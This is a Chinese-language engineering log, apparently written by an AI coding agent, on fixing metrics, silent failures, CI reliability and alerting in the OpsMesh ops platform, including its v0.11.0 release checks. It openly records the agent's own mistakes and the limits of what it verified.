| 4 | **`Init(serviceName)` 是哑按钮** | 参数存进 `Registry.service` 后**从不被读**（只在 `:30/:51/:53/:55` 出现） | 12 个微服务产出的家族名逐字相同（无前缀），本地 `curl` 对比时分不出来源；§22 抓到的 `--skip-images` 同族 |

### 25.2 修法

1. **拆类型**：`SetBusinessMetric`（gauge → `business_metrics`）与 `AddBusinessMetric`（counter →
   新家族 `business_metrics_total`）。同名 gauge/counter 靠键前缀 `g:`/`c:` 不互相覆盖。
   9 个错误调用点迁到 counter 并**去掉名字里冗余的 `_total` 后缀**（家族已带）：
   `device_heartbeats` / `agent_heartbeats` / `task_claims` / `task_reports` /
   `alert_notifications` / 两个 `*_failures` 等。
2. **基数三层**：`NormalizePath`（数字段/超长段/非法字符段 → `:id`，整路径超长 → `/:overlong`）→
   方法**总是**先收敛到 7 个标准方法 + `:other`（原来只在超限时收敛，意味着任意方法文本可先占满 2000 个名额）→
   上限 `maxHTTPSeries=2000` / `maxBusinessSeries=2000` 超限折叠 `path=":other"` / `folded=":other"`，
   并导出 `http_metrics_series`、`http_metrics_series_dropped_total`、`business_metrics_series{,_dropped_total}`
   让折叠**可告警**。标签值另加 `sanitizeLabelValue`（非白名单字符或超长 → `:other`）。
   直方图键改为**从折叠后的键派生**：`histKey := k[:LastIndexByte(k,'|')]`——用原始 method 拼会绕开上限。
3. **恒零仪表**：`active_connections` 由中间件按在途请求 `+1/-1` 真实喂数（含新增用例断言）；
   `queue_depth` 连同 `RecordQueueDepth` **删除**（没有真实 backlog 数据来源就不该出现在抓取面上；
   task-svc 的真实待执行量属第 2 批，见 §25.5）。
4. **哑按钮**：`Init` 的服务名渲染成 `service_info{service="..."} 1`。
5. **调用点侧的基数修复**：心跳/领取/上报的 `device_id` / `agent_id` / `task_id` 标签**去掉**
   （每台设备一条序列才是问题根源，上限只是兜底），`auto_provision_loop_failures` 去掉 `backoff` 标签
   （退避时长每次翻倍都是新取值，本质无界）。`tenant_id` 保留（租户数由商务决定，有界）。
6. **防复发的静态门禁**（`validate-deploy-assets.sh` 第 12 节）：生产代码里
   `Set/AddBusinessMetric` 附近出现以 `_id` 结尾的标签键（`tenant_id` 例外）即判红；
   counter 指标名重复 `_total` 后缀也判红。**已故障注入验证**：把 `agent_id` 标签和
   `task_claims_total` 加回 `task-svc/internal/service/service.go:211` → 两条 `[FAIL]` 同时命中，还原后转绿。

### 25.3 这是破坏性变更（升级必读）

- 序列类型变化：原先 9 个 `business_metrics{name="*_total"|*_failures"}` gauge →
  现在是对应的 `business_metrics_total{name="..."}` counter。**已有查询/告警必须改写**
  （好在出厂规则与面板一个都没引用它们——`grep -r 'business_metrics' deploy/ docs/` 只命中本轮新代码，
  实测确认，所以本轮不背客户断更的债）。
- 删除 `queue_depth` 序列。
- 所有 HTTP/直方图序列的 `path` 标签值被归一化（`/api/v1/devices/123` → `/api/v1/devices/:id`）。
- 因此这批归到 **v0.11.0 的破坏性清单**，不进补丁版本。

### 25.4 验证与两处自己的失误（主动披露）

- `pkg/metrics` **27 个用例全绿**（新增 10 个：归一化、上限折叠、未知方法折叠、gauge/counter 同名不撞、
  TYPE 行、标签 sanitize、业务折叠、中间件喂在途数、数字 ID 并集、counter 累加）。
- **变异检验 9 项全部被杀**：放宽两个上限、counter 退回覆盖、去掉 sanitize、方法不提前收敛、
  histKey 用原始 method、不登记折叠键、去掉路径归一化、状态码不进标签、`service_info` 丢服务名。
- 失误一：**测试最初用实现常量推导期望**（`maxHTTPSeries+500` 次写入、断言
  `http_metrics_series <code>maxHTTPSeries+1</code>`），于是"把上限改大"这个变异**同时改大了用例自己**
  ⇒ 变异存活。改成写死 2500 / `2001` / `500` 后同一变异被判红。教训：**用例的输入与断言都不能引用被测实现的常量**。
- 失误二：**变异脚本没有 `finally` 恢复**。一次后台超时终止把 `maxHTTPSeries = 100000000` 和
  `agent_id` 标签留在了源码里，靠事后 `grep` 才发现并回滚。故障注入必须自带无条件恢复，
  且变异幅度要有界（1e8 会让用例真去分配百万个键）。
- 构建面：根模块 + **12 个服务模块** `go build ./...` 全过；`alert-svc` / `device-svc` / `task-svc`
  全量 `go test ./...` 绿；`gofmt -l` 干净。门禁 `PASS=36 / FAIL=0 / SKIP=1`
  （SKIP 是离线取不到 kubeconform schema 的既有分流，非本轮引入）。

### 25.5 第 2 批（真业务指标）待办

管道已就绪，逐服务挑业务指标时可直接用 `AddBusinessMetric`（事件计数）与
`SetBusinessMetric`（当前存量），标签预算受第 12 节门禁约束。已调研出的候选面（含证据行号）：
task-svc 的 `dead_letter` 与 `retry_count` 耗尽（`mysql.go:361-374`）、真实待执行队列深度、
auth-svc 的 `status=pending` 注册积压（`gateway.go:287-289`）、alert-svc 熔断器吞掉的错误
（`service.go:246,270` 的 `_ = s.breaker.Execute(...)`）、log-svc 在 ES/Loki 后端下
`Append` **静默不落盘**（`pkg/logstore/es.go:33`、`loki.go:33`）与内存环形缓冲丢行、
autoscaler 的 `e.decisions` **无界增长**（`evaluator.go:147,357`）、gpu-svc 的占位队列
（`scheduler.go:123-126`）、runbook-svc 内存存储重启即失。
其中 log-svc 的静默 no-op 与 autoscaler 的无界历史本身是缺陷，属"先修再计量"还是"先计量暴露"需一次决策。

## 26. 三处"已经在线但看不见"的失败（2026-09-30，③b 第 2 批前置）

用户定的路线是"先修缺陷再计量"。§25.5 列出的候选面里，有三条不是"缺指标"，而是
**失败已经发生却没有任何观测面**——给它们加指标之前，先得让"有没有失败"成为事实。

### 26.1 缺陷 A：ES/Loki 的 `Append` 是 `return nil` 的 no-op（两条孪生实现）

| 位置 | 原行为 | 后果 |
|---|---|---|
| `services/log-svc/pkg/logstore/es.go:33`、`loki.go:33`；`internal/logstore/elasticsearch.go:45`、`loki.go:46` | `Append` 返回 nil（注释写"由采集器直推"） | 接口契约上"成功" |
| `internal/controlplane/grpc/grpc.go` ReportLogs 的 M6 桥接（逐行 `_ = ls.Append(...)`） | agent 日志每行被丢弃，agent 仍收 OK（`SaveLogs` 是另一个存储，成功了） | **静默丢失整条 agent 日志检索面** |
| `internal/logstore/handler.go` `POST /api/v1/logs` | 检查 err 后回 **500** | 能力不匹配被报成服务端故障，误导排障 |
| `services/log-svc/.../service.go` AppendLog | no-op 后仍 `return entryToProto(entry)` | 客户端拿到 **ID=0 的"写入成功"载荷** |
| `handler.go` `RecordTaskResult`（`_ =`） | 任务 stdout/stderr 从未进索引 | 静默 |

**修法**：`ErrAppendUnsupported` 哨兵 + `SupportsAppend(LogStore) bool` 能力探针（只读后端实现
`AppendUnsupported() bool { return true }`）。设计要点是**在循环之前判一次**：能力错配是一个
部署事实，不是一个每行错误——逐行拿到同一个哨兵只会把一次错配放大成上万次无效调用，
仍然一条都写不进去。`POST /logs` 改 **501 + 固定文案**（5xx 不回吐 `err.Error()`，
守 `TestNoRawErrInServerErrorResponses`）；gRPC 桥接整轮跳过并只打**一条** WARN
（`appendWarnOnce` 进程级闸门）；`AppendLog` 映射 `codes.Unimplemented`，不再伪造成功载荷。

**客户可见变化**：ES/Loki 部署下 `POST /api/v1/logs` 由 201 → 501。`docs/api-reference.md`
原文写的是"loki/es 模式下为 noop"，已同步为新语义与迁移指引。

### 26.2 缺陷 B：autoscaler 决策历史无界增长

`e.decisions` 每次评估 append、从不裁剪，同时冷却判定要从尾部反向扫 ⇒ 内存与每次评估的
扫描成本一起无穷增长。修法 `maxDecisionHistory = 500`（依据取自本包自己的默认：scaleUp 60s /
scaleDown 300s × ~30s 评估节奏 ≈ 每规则每窗口 10 条 ⇒ 500 够 50 个规则用满，量级 KB）、
**头部丢弃 + `copy` 复用底层数组**（不每次新建切片，否则把 O(n) 扫描变得更糟），
并新增 gauge `autoscaler_decision_history_entries` 让占用可告警。

**方向是关键**：冷却扫描读尾部，若裁剪保最旧，缓冲区绕回后**冷却静默失效**并引发扩缩容抖动。
`TestCooldownStillWorksAfterHistoryWrap` 就是钉这一点的变异诱饵。

### 26.3 缺陷 C：ack/resolve 的外部通知失败被 `_ =` 吞掉

`services/alert-svc/internal/service/service.go` 四个调用点（ack/resolve × 走熔断器/直调）
丢弃错误：本地状态已改、请求返回 OK，而 PagerDuty 侧没收到——**运维以为 on-call 已被通知**，
这比直接报错更危险。修法：捕获 → WARN（`action`/`alertID`/错误文本）+
`business_metrics_total{name="alert_external_notify_failures",action=…}`。
**刻意不向上返回 err**：ack/resolve 的事实来源是本地状态，让远端故障升级成 5xx 会诱导操作者
反复点击，且熔断器打开期间会彻底无法确认告警。与触发侧已有的 `alert_notifications*` 不重复计数。

### 26.4 一处边界纪律（实现过程中自造，已纠）

服务层原本没有日志器，实现时引入了根的内部包 `internal/logx` ——复核后发现这是**全仓唯一**一处
服务模块 import 根 `internal/`（`grep -rn "OpsMesh/internal/" services/` 生产代码命中 1 处即它）。
后果是这些服务的构建与控制面内部包绑死（本仓既有边界：服务只依赖 `pkg/*` 与顶层包，
所以"改 internal/store|internal/metrics 只需重建控制面镜像"才成立）。已改回服务层惯例
（标准库 `log.Printf("[alert-svc] WARN …")`，由 `cmd` 侧 `pkg/log.Init` 接管成 JSON），
并复核 `services/` 全域无残留。
**教训**：并行实现的代码要按"这条依赖会不会改变构建边界"审一遍，光看编译过不过是不够的。

### 26.5 验证（含独立复做的变异）

- 四条腿 `go build ./...` + `go test -count=1 ./...` 全绿（`internal/logstore`、
  `internal/controlplane/grpc`、log-svc、autoscaler-svc、alert-svc）；
  `golangci-lint 2.13.2` 对 `./internal/...` 与三个服务模块均 **0 issues**。
- **我自己独立复做的变异**（不采信转述）：① `grpc.go` 守卫改 `if false && !SupportsAppend(ls)`
  → `TestReportLogs_UnsupportedBackendSkipsForwarding: 只读后端须整轮跳过写入，实际被 Append 3 次`；
  ② autoscaler 裁剪改保最旧 → `TestDecisionHistoryKeepsMostRecent` 四条断言 +
  `TestCooldownStillWorksAfterHistoryWrap` 同时判红；两处均 `finally` 还原并复跑全量绿。
- 子代理自报"一次 Edit 误删了既有测试的一行、已恢复"——我用 `git diff --numstat` 复核为
  **174 插入 / 0 删除**，属真恢复（这类自伤必须机器复核，不能采信描述）。
- 第 12 节业务指标门禁对新标签 `action`（两个字面量）放行，对实体 ID 标签仍判红。
- **诚实边界**：`go test -race` 本机无 C 编译器不可用，由 CI 的 `Race detector` 覆盖；
  本批**未跑真机栈**（ES/Loki 后端需要外部服务），501 与 WARN 单次去重的运行时表现由
  CI 单测 + 后续部署验证，不称"已现场复现"。

## 27. 业务指标接线第 1 步：先否掉一半候选（2026-09-30）

§25.5 那份候选面是"看起来该有指标"的清单，本轮先逐条核**数据源是否已经存在**，结果是
**五条被否、两条落地**。否掉的比重复列一遍更有价值：它们说明"加指标"这个动作本身
不能替代实现。

### 27.1 被否的候选（附证据）

| 候选 | 核查结论 | 为什么不做 |
|---|---|---|
| task-svc 待执行队列深度 | 无 `COUNT` 方法；最便宜路径是 `ListTasks(tenant,"pending",…)`（`store/mysql.go:162-188` 选 24 列，含 `content`/`command` 两个 TEXT，并逐行 `scanTasks` 物化） | 抓取间隔内周期性拉全表换一个数字，指标自身变成负载源。要做得先加 `SELECT COUNT(*)` 存储方法（另批） |
| task-svc dead-letter 计数 | `dead_letter` 列存在（`mysql.go:361-364`、memory `store.go:176-179`）但**没有任何聚合查询**，`ListTasks` 也不支持按它过滤 | 同上，只能全表扫 |
| auth-svc 待审批注册数 | `ListUsers()` 无过滤，且 MySQL 实现对每行再查一次角色（`store/mysql.go:220-239` 的 N+1），`users` 表也没有 status 索引 | 数一个"有多少人在排队审批"要付全表+N+1 的代价 |
| alert-svc firing / 升级中数量 | 只有 `Alerts()` 全切片扫（`store/store.go:71-83`）；`ListActiveEscalations` 是 RLock 下复制全部活跃项（`escalation.go:348-360`） | 同上 |
| gpu-svc 调度队列深度 | `GetQueue()` 是**字面返回空切片的占位实现**（`scheduler/scheduler.go:123-125`），并沿 `service.go:219-220 → handler.go:314-320` 传出去 ⇒ `/schedule/queue` 恒 `[]` | **在它上面出指标就是编造数字**。要做的是先决定该服务是否需要真队列（产品决策） |

顺带确认：`runbook-svc` 只有内存存储（`cmd/runbook-svc/main.go:30` 唯一构造点，整模块零 `mysql` 引用），
执行历史重启即失——这也是产品决策，不用指标掩盖。

### 27.2 落地的两条：代码早就算出来了，只是没人报

- **task-svc 调度吞吐**：`cmd/task-svc/main.go` 的 `reclaimFn` / `fireFn` 每轮都算出 `reclaimed` /
  `fired` 并 `return` 给调度器，成本为零。补 counter `task_reclaimed`、`task_scheduled_fired`，
  并各补一列失败数 `task_reclaim_failures`、`task_scheduled_fire_failures`。
  **失败单独成序列是关键**：只有成功数时，"这一轮全部 `UpdateTask` 失败"（=数据库在拒绝写入）
  与"这一轮确实没有可回收/到点任务"在指标面上完全同形。计数就地出、不上抛重算，
  免得又变成一个派生指标。
- **log-svc 内存环形缓冲淘汰数**：`MemoryLogStore` 原先静默挤掉最旧条目。补 `dropped` 字段 +
  `Dropped()` + `log_memory_dropped` counter。淘汰前"这条日志被容量挤掉了"和"这条从没写过"
  在检索面同形。计数**自己记账**而不是 `seq - len(buf)` 反推——后者并发下取不到一致快照，
  而这正是要被告警读的数字。

### 27.3 验证与未覆盖面（如实）

- 新用例 `TestMemoryRingDroppedCounted`：未超容量不计数、超 4 条计 4、只留最新 `cap` 条、
  `/metrics` 里出现在 **counter 家族**且不在 gauge 家族（写成 gauge 就恒值、`increase()` 无意义）。
  **变异检验**：把计数改成 `+= 0` ⇒ `淘汰计数 = 0, 期望 4` 判红；`finally` 还原后复跑全绿。
- `task_scheduled_*` 四条序列**没有单测**：发出点在 `package main` 的闭包里，要测得先把闭包
  提出去重构，本批没做。依据只有：编译通过、所在函数已有测试、门禁第 12 节校验标签。
- log-svc / task-svc 两模块 `go build` + `go test -count=1 ./...` 全绿，
  `golangci-lint 2.13.2` 0 issues，`gofmt -l` 干净，门禁 `PASS=37 / FAIL=0 / SKIP=0`。

## 28. v0.11.0 发布 + 两条"我自己写的修复被真跑证伪"的记录（2026-10-01）

### 28.1 v0.11.0 四条验收（tag `749f88e`）

| 标准 | 结果 |
|---|---|
| ① GitHub Release 资产 | **5 个**（checksums + linux/amd64、arm64 各一对 tar.gz + `.sbom.json`），`isDraft=false`、`target=main` |
| ② 核心镜像版本化标签 | `opsmesh-binary:0.11.0`、`opsmesh-agent:0.11.0` 均 200，且 `.sig`、`.att` 都 200 |
| ③ 微服务镜像 | **12/12** `:0.11.0` 可解析 |
| ④ 签名 / SBOM 证据 | `.sig` **14/14**、`.att` **14/14**（v0.10.0 时 `.att` 为 0/14 ⇒ **本版是第一个镜像级 SBOM 成为交付物的版本**）；另有 **12 份 `sbom-*` workflow 产物** |

切标签前取了基线（`release not found`、两镜像 `0.11.0` 404），所以上面的 200 可归因于本次发布而非残留。
标签打在 `749f88e`——它是当时**自身 CI 全绿**的提交（12 条腿 success、`release` 设计内 skip），
沿用"不 tag 未验证提交"的口径。

### 28.2 归版时的一处方法错误（blame 不能用来判定归属）

要标注"哪些 `[Unreleased]` 块属于本版"，我先用 `git blame` 取每块表头的提交再做 tag 祖先判定。
**这条路是错的**：blame 给的是"最后一次修改该行"的提交，而历史上有人归版时会在**标题行末尾追加
`（已归入 X.Y.Z）`** ——这一编辑本身就改变了 blame 归属。实测有两个块的表头同时出现在
`v0.9.1..v0.9.2` 与 `v0.9.2..v0.10.0` 两个窗口的"新增行"里，据此盖章会把已发布内容标成别的版本。

改用正向枚举：`git log <A>..<B> -U0 -- CHANGELOG.md | grep '^+## \[Unreleased\]'`，
对每个 tag 窗口列出"这期间新写了哪些块"，10 块归属唯一无歧义。
**41 个 v0.10.0 及更早的历史块按同一约定保留原样不动**：它们同样缺标注，但在上述污染下无法可靠归属，
宁可留白也不批量盖章制造假事实。

### 28.3 一条 CI 可靠性缺陷，我的前两版修复都被真跑证伪

`E2E (real backend)` 在 run `36891256812` 红。日志显示：`timeout 300` 打断
`playwright install --with-deps` 后，其 apt-get 子进程仍在跑并持有 `/var/lib/dpkg/lock-frontend`，
**立刻重试**撞 `E: Could not get lock` ⇒ `exit 100`，一个用例都没跑到。

- **v1（749f88e）**：重试前用 `fuser` 等锁释放 + 窗口 300→420s。
  **被下一个 run 证伪**：`36900780035` 的 `E2E (security)` 仍红，时间线是
  `17:59:55 检查锁——自由` → `sleep 10` → `18:00:06 重试` → `18:00:07 Could not get lock`。
  根因比"没等锁"更糟：**apt 在下载阶段不持 dpkg 前锁，进入解包阶段才持**，
  所以任何"先等再重试"的时序都留有窗口。两个 apt-get 生命周期只要可能重叠就不可能安全。
- **v2（97821f7）**：把两种失败模式拆开——OS 依赖走 `install-deps`（900s 窗口、不被打断后立即重试，
  两次都失败只打 `::warning::`，真实后果留给用例暴露）；浏览器下载走 `install chromium`
  （不带 `--with-deps`，保留 timeout+重试，因为它不碰 apt，杀掉不留持锁孤儿）。
  **`install-deps` 这个子命令名是本机 `npx playwright install-deps --help` 实测确认的**，不是臆造。
  验证：run `36905543508` 里 `E2E (security)` 与 `E2E (real backend)` **双双绿**。

诚实边界：这一绿证明新代码路径正常且没破坏好路径；**竞态本身需要慢镜像才触发**，所以依据是
"结构上不再可能重叠 + 真跑绿"，不是"我复现了竞态并修好了它"。

### 28.4 过程中我自己制造的两个错误（都当场发现并纠正）

1. 替换三段共用片段时用了非贪婪正则 `# --with-deps.*?\n          \}`，它匹配到
   `wait_apt_lock()` **自身**的右括号，于是每处只换了一半、留下 7 行孤儿仍在跑旧的
   `--with-deps` 重试。若只看"YAML 能解析 + actionlint rc=0 + shellcheck 0 findings"，
   这个缺陷能一路混进 CI。发现方式是**打印每个 step 里 playwright 相关命令行**逐条看——
   门禁与 linter 都不会告诉你"多跑了一段没删干净的旧代码"。
2. 一个 bash 监视循环里 jq 写成 `(…)|join(",") or "无"`，jq 的 `or` 返回布尔，
   于是"完成 0/13 | 红:true"这种无意义输出被我自己当成信号看了几分钟。
   监视表达式要先确认它会打印什么，再拿去盯东西。

## 29. 「配了告警」与「收得到告警」之间差三层（2026-10-02）

本轮的触发点很小：把 v0.11.0 新产出的业务序列接进出厂告警。做完之后它变成一次
"三层静默"的取证——每一层都不报错，每一层都足以让告警永远不响。

### 29.1 第一层：三域进栈两个月，抓取面从来没跟上

`deploy/monitoring/prometheus.yml` 只有 9 个微服务 job。incident-svc / runbook-svc /
autoscaler-svc 三个 job **不存在**，而这三个容器在 `docker-compose.prod.yml:877/917/957`
里是**默认启动**的（该 compose 文件没有任何 `profiles:`，所以"按需启用"这种解释不成立）。
服务侧 `/metrics` 是注册好的（`services/incident-svc/cmd/incident-svc/main.go:49`、
`runbook-svc:50`、`autoscaler-svc:38`），所以缺的不是能力，是**采集配置**。

也就是说：v0.10.0 把三域"转正"，v0.11.0 给 autoscaler 加了 `autoscaler_decision_history_entries`，
但这条序列在出厂 compose 栈里**从未进过 Prometheus**。假如当时已经写过对应告警，
它会是一条语法正确、评审通过、永远不响的规则。

### 29.2 第二层：门禁把「注释」当成了「事实」

§11 本来是有双向判定的（有 job 必须有 `/metrics`；有 `/metrics` 必须有 job 或进豁免表）。
它仍然判绿，原因在豁免表：

```
NOT_SCRAPED_EXEMPT="autoscaler-svc incident-svc runbook-svc tf-provider"
# 前三者不在 compose 生产栈里（走 chart 的 ServiceMonitor）
```

**注释这句话在 2026-09-29 之后就过期了**，但门禁读的是表里的名字，不读理由，也不核对
"它到底在不在栈里"。这就是本项目登记过很多次的形态：*一条人工维护的理由，被当作机器判定用*。
三域转正那次改了 compose、改了 values、改了 init-databases，唯独没人回头看 prometheus.yml 的注释。

修法不是把注释改对（下一次变动还会再过期），而是把理由换成可核验的事实，新增 §11c：

- 出厂 compose 栈里 + 暴露了 `/metrics` ⇒ **必须**有抓取任务，豁免表对这类服务一律无效；
- 豁免表里挂着仍在栈里的服务 ⇒ 直接判红（豁免条目必须自己经得起核验）。

`tf-provider` 成为唯一合法豁免（Terraform 插件，无 HTTP 面）。

同一处还有 §12 的扫描面缺陷：业务指标命名/标签规则只扫 `services/*/internal/**`，
而 task-svc 的 `task_reclaimed`/`task_scheduled_fire_failures` 写在 `cmd/task-svc/main.go`
（计数就地出，见 §27.2 的理由），完全不在规则管辖内。已扩到 `cmd/` 与 `pkg/`。

### 29.3 第三层：名字对不对，前缀式契约测试根本看不见

`internal/controlplane/metrics_contract_test.go` 是 §21 那轮立的功：从出厂规则里抽
`opsmesh_*` / `process_*` 的序列名，逐个要求在控制面真实 exposition 里出现。
但微服务侧（`pkg/metrics`）**不带前缀**，业务序列更是共用家族名靠标签区分：

```
business_metrics_total{name="task_reclaim_failures"} 3     ← counter
business_metrics{name="autoscaler_decision_history_entries"} 500   ← gauge
```

于是两类错误对老测试完全隐形：

1. `name="task_reclm_failures"`（少一个字母）——PromQL 合法，Prometheus 不报错，恒 no data；
2. 给 counter 配 `increase()` 却选中 `business_metrics{}`（gauge 家族）——同样合法、同样静默。

新增 `metrics_contract_msvc_test.go` 五条判定，把这一族纳入机器对账：

| # | 判定 | 立它的理由 |
|---|---|---|
| ① | 规则/面板里每个 `name` 值都必须由某服务的 `Add/SetBusinessMetric` 真的产出 | 名字打错=永久静默；常量写法（`externalNotifyFailureMetric`、`decisionHistoryGauge`）与常量拼接（`shadowMetricPrefix+"_…"`）都要能解析，解析不出**判红而不是跳过** |
| ② | 产出该序列的服务必须在 `prometheus.yml` 里有 job | 把 §29.1 那类漏采直接钉成红；引用得到、抓不到，等于没引用 |
| ③ | `{__name__=~"a|b|c"}` 的每个分支必须有渲染器 `# TYPE` 声明 | 两套命名族并集是这类栈里最容易只写对一半的写法；histogram 还要派生 `_bucket/_sum/_count` |
| ④ | compose 与 chart 两份装载点的 alert 名 / `expr` / `for` / `severity` 逐条相等 | 两条交付路径两份副本必然漂移；K8s 客户不该"看起来配了告警、实际少几条" |
| ⑤ | 规则里写死的 500 必须等于 `maxDecisionHistory` | 阈值与代码常量脱钩是双向失效：写高永不触发，写低天天误报 |

顺带修了老测试一处**名不副实**：它的注释说只解析 §4.1 表格，实际是全文扫描。新增 §4.1.1
（微服务序列口径表）时这条会立刻误判——`business_metrics_total` 是微服务家族，控制面 exposition
里当然没有。已把解析范围收紧到小节边界（`### 4.1 ` 到下一个 3/4 级标题），文档侧新增
`TestDocumentedMicroserviceMetricsAreScraped` 管 §4.1.1：**每个名字还要归对服务**
（把 task-svc 的指标写成 device-svc 产出会指错排查方向与抓取排期）。

### 29.4 一条已发布就坏、九个月无人知的面板

写新面板时对全部表达式做了一次真实语法校验（用模块缓存里的 `promql/parser` v0.314.0，
在仓库外起临时 Go 模块，**没给仓库加依赖**）。37 条规则表达式全通过，面板里却抓出一条：

```
sum(rate({__name__=~"opsmesh_http_requests_total|http_requests_total"}{status=~"5.."}[5m])) …
                                                                        ^^^^^^^^^^^^^^^^^^^
```

选择器后面紧跟第二个 `{…}` 不是合法 PromQL——应当合进同一个花括号用逗号分隔。
这是 "Error Rate" 面板，**自 v0.9.x 就在出厂仪表盘里**，也就是说这条错误率曲线从来没画出过东西。
告警侧同概念的 `HighErrorRate` 写对了，所以只有面板坏；这类缺陷 YAML 解析、Grafana provisioning、
`helm lint`、shellcheck 全都不报警，只有真去解析表达式才会露出来。

CI 里跑不了 promtool（镜像不在白名单、也不值得为此引入依赖），所以 §14 只钉四类**确定性结构错**：
相邻选择器、括号不配平、`rate/irate/increase/delta` 缺区间、`histogram_quantile` 作用在非 `_bucket`。
LogQL 面板（Loki 数据源）显式跳过——判据不能把另一种查询语言当 PromQL 判红。
本节所有"门禁有效"的说法都经过重新注入验证（见 29.6）。

### 29.5 阈值口径为什么这么选

- **比率优先于绝对次数**（领取/回报/推送失败）：绝对阈值在 20 节点小集群永不触发、
  在 5000 节点上又太迟钝，这与 §21 里 `DeviceOffline` 从"离线 > 10 台"改成占比 >20% 是同一个理由。
- **分母一律 `clamp_min(…,1)`**：零流量时 `0/0 = NaN`，而 NaN 在 Prometheus 里等于"不评估"——
  那正是本轮要消灭的静默形态，不能自己在告警里再造一遍。
- **单次事件即告警的只有三条**（`task_scheduled_fire_failures`、`task_reclaim_failures`、
  `alert_external_notify_failures`）：它们的事实来源是"已经落库失败"，量小不代表不要紧；
  其中外部通知失败给 critical，因为它的用户可见症状是**运维以为 on-call 被呼叫了**。
- **缺席不告警**：事件驱动序列在没有事件时本就不出序列。把"还没发生"当"没接线"判红会造出一堆
  假红；所以缺席靠 §11c/②（抓取面存在性）与文档口径保证，而不是靠 `absent()`。
- 没有加"调度停摆"类告警（`task_scheduled_fired` 长时间为 0）：一个没有定时任务的栈合法地恒 0，
  这条规则出厂即误报，属于要先有产品口径才能定的东西，登记而非实现。

### 29.6 验证与变异（9 项全判红）

| 手段 | 结果 |
|---|---|
| `go build ./...` / `go vet ./internal/... ./pkg/...` | RC=0 |
| `go test ./internal/controlplane/ -count=1`（整包） | ok 42.4s（含新增 5 条测试） |
| `validate-deploy-assets.sh` | PASS=40 / FAIL=0 / SKIP=1（SKIP 是需 docker 的 helm 渲染项） |
| `helm lint` + `helm template --set observability.prometheusRule.enabled=true`（原生 v3.14.0） | 通过；渲染产物再用 YAML 解析确认 **9 条规则结构存在**——第一版我插的块缩进不对，`helm template` 照样成功而 `rules` 解析成 `null`，是这一步把它逼出来的 |
| PromQL 表达式逐条 `ParseExpr`（真实 parser） | 规则侧 37 条全通过；面板侧 16 条 PromQL 全通过（第 17 个面板是 Loki 数据源的 LogQL，不参与 PromQL 校验）。**修复前面板里有 1 条不合法**（§29.4），修复后复跑 16/16 |
| 变异 9 项 | M1 名字打错、M2 删抓取 job、M3 chart 删一条、M4 两份一起改阈值、M5 `increase` 丢区间、M6 放回坏面板、M7 豁免表挂回在栈里的服务、M8 文档服务归属写错、M9 文档写不存在的名字——**全部按预期判红**；跑完 `md5sum -c` 六/七个文件一致（无残留） |
| `verify-runtime.sh` §7 新断言 | 三种合成输入自证：齐（紧凑 JSON）→ 绿；齐（带空格 JSON）→ 绿；抽掉 autoscaler → 只报 autoscaler。第一版判据写死紧凑排版，在带空格输入下把 13 个全报缺——**假红**，改成容忍排版后才对 |

没做的事，写清楚：

1. **没有活栈证据**。本机 Docker 守护进程未运行，没有起 compose 栈，所以「规则能被 Prometheus 成功加载」
   「告警在真实序列上会 pending→firing」这两点本轮**未验证**（语法与引用存在性 ≠ 加载成功）。
   `verify-runtime.sh` §5b/§6/§7 才是这一层的工具，需要一次起栈运行。
2. **Alertmanager 不在出厂栈**：`prometheus.yml` 的 `alerting:` 段是注释状态，compose 服务清单里也没有它。
   所以本轮所有规则只产生**状态**。已在 §4.3 明写，并给出两条接法（接客户已有 Alertmanager / 外部告警器读 rules API）。
3. chart 侧 `services.<name>.enabled` 默认 false：K8s 客户不显式开服务时，这组规则就是 no data——
   文件里已注明「没有告警不等于健康」。
4. `shadowMetricPrefix` 系三个名字带 `opsmesh_` 前缀却是**微服务侧** gauge（影子模式对照用）。
   它们故意不进规则：一旦写进 `prometheus-alerts.yml`，老的 §21 契约测试会因为 `opsmesh_` 前缀
   去控制面 exposition 里找它们而误判红。这是一个真实的判据交叉污染，本轮记下不修（要修应先让
   老测试排除 business 选择器内的名字）。
5. 未加的告警：device-svc 的 `device_heartbeat_failures` / `agent_heartbeat_failures`
   （调用方已拿到错误、5xx 面可见，再告属重复）与 `auto_provision_loop_*`（默认关闭的 D3 特性，
   出厂规则里放一条常态 no data 的规则是"看起来有覆盖"而非覆盖）。

### 29.7 两处自伤（都当场发现）

1. 变异脚本的 `GO_TESTS` 清单是我手写的四条测试名，**漏列新加的文档测试**，于是 M8/M9 首轮显示
   "漏判"。补进清单后两条都判红。这条要留着：*变异脚本自己的清单也是一种门禁*，
   新增测试不同步它，就会把"测试有效"写成"看起来漏判"。
2. 让变异脚本在后台跑的同时用 Edit 改它备份清单里的同一个文件——`restore()` 把我刚加的测试
   覆盖掉一次。变异/还原类脚本运行期间不要并发编辑它管辖的文件；备份要在工作树处于目标状态时重做。

### 29.8 真机跑了一次，抓出一件静态检查永远抓不到的事（2026-10-02）

Docker 起来之后做了三件事：① 用真实 `prom/prometheus:v2.55.0` 挂载仓库里那份
`prometheus.yml` + `prometheus-alerts.yml` 起 Prometheus，验证出厂配置与规则**被成功加载**；
② 拉 **已发布的 `ghcr.io/levango7/task-svc:0.11.0`** 镜像（不是本地重建，是要交付的那个产物）
单独跑起来，配一个只抓它的 Prometheus，把出厂规则原样挂进去；③ 对它打满路径，
真实触发一次基数折叠，看新告警到底会不会响。

**加载面**：`Completed loading of configuration file … rules=26.8ms`，无 error；
`/api/v1/rules` 给出 6 组 23 条（当时）全部注册成功；`/api/v1/targets` 有 18 个活动 target，
verify-runtime §7 新断言里那 13 个 OpsMesh 目标**一个不缺**（incident/runbook/autoscaler 三条
新 job 都在，只是本环境没有对应容器所以 DOWN——这正是漏配 job 与"配了但服务没起"的区别）。

**抓到一条我自己写的坏规则**（这就是跑真机的回报）：

```
OpsMeshMetricsCardinalityFolding | health=err
lastError = vector cannot contain metrics with the same labelset
```

成因：`increase({__name__=~"http_metrics_series_dropped_total|business_metrics_series_dropped_total|opsmesh_…"})`。
`increase()` 的结果**会丢掉 `__name__`**，而前两个名字在**每个微服务上同时存在**，
丢弃后两条序列的标签集完全相同 → 结果向量非法 → 规则评估失败、永不触发。
关键点在于它**语法完全合法**：§14 的四类结构判定、真实 PromQL parser 的 `ParseExpr`、
以及"名字必须存在 + 服务必须被抓取"的契约测试全都放行。同文件里 `HighErrorRate` 用同样的
并集写法却没事，因为前后缀两族不会落在同一个 instance 上——**这类缺陷取决于"同一实例上是否共存"**，
是静态检查的结构性盲区。

修法：拆成两条。HTTP 侧保留并集（控制面 `opsmesh_` 与微服务无前缀名互斥，安全）；
